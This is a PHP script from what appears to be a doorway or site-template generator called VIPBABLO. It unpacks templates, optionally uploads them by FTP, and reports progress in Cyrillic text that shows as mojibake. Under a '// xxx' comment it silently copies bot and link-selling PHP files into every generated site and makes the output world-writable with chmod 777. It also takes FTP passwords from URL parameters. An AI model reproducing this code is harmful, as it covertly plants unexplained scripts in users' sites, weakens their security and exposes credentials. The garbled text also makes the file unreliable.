<?
$putarh='../done/'.$templname.'/'.$templname.'.zip';
$archive = new PclZip($putarh);
$list = $archive->extract(PCLZIP_OPT_PATH, "../out");
		if($_GET['type']=='php'){
$putarh='../templates/php.zip';

$archive = new PclZip($putarh);
$list = $archive->extract(PCLZIP_OPT_PATH, "../out");

	}
echo '������������� ������: [<b>��</b>]'. "</b><br>\r\n";
	    echo '<script language="JavaScript">scrl(30)</script>';
		flush();
$name="../zip/temp".time().rand(0,999).".zip";

if($_GET['onftp']=="true"){
	$conn_id = ftp_connect($_GET['ftpserver']);
if (@ftp_login($conn_id, $_GET['ftpuser'], $_GET['ftppass'])) {
    echo "���������� ���� �� ".$_GET['ftpserver']." ��� ������ ".$_GET['ftpuser']."<br>\n";
} else {
    echo "�� ������� ����� ��� ������ ".$_GET['ftpuser']."\n<br>";
    exit();
}
echo '������� �� ���: [<b>��</b>]'. "</b><br>\r\n";
	    echo '<script language="JavaScript">scrl(30)</script>';
		flush();
$src_dir = "../out";
$dst_dir = $_GET['ftppatch'];
ftp_copy($src_dir, $dst_dir);
ftp_close($conn_id);
echo '��������: [<b>�����</b>]'. "</b><br>\r\n";
	    echo '<script language="JavaScript">scrl(30)</script>';
		flush();
	    echo '<script language="JavaScript">window.parent.frames[\'footer\'].location="ok.php?ftp=ok";</script>';
		flush();
}
  //$archive = new PclZip($name);
  //$archive->create('../out', PCLZIP_OPT_COMMENT, "�������� ������������ VIPBABLO ��������� ���������� v.4.0.0 beta\r����������, ������� � ������ ������ �� www.vipbablo.ru\r����������� ������� �� vipbablo@gmail.com\r\n���� � ICQ 70-70-629, �� ������ ������� ICQ: 657526");

echo '���������� ��������: [<b>��</b>]'. "</b><br>\r\n";
	    echo '<script language="JavaScript">scrl(30)</script>';
		flush();
echo '��������: [<b>�����</b>]'. "</b><br>\r\n";
	    echo '<script language="JavaScript">scrl(30)</script>';
		flush();
	    echo '<script language="JavaScript">window.parent.frames[\'footer\'].location="ok.php?arr='.urlencode($name).'";</script>';
		flush();

// xxx

copy('../zaliv/botsxxx.dat', '../out/botsxxx.dat');
copy('../zaliv/botsxxx.php', '../out/botsxxx.php');
copy('../zaliv/codxxx.php', '../out/codxxx.php');
mkdir('../out/xxx');
copy('../zaliv/xxx/sape.php', '../out/xxx/sape.php');
system('chmod -R 777 ../out');

?>
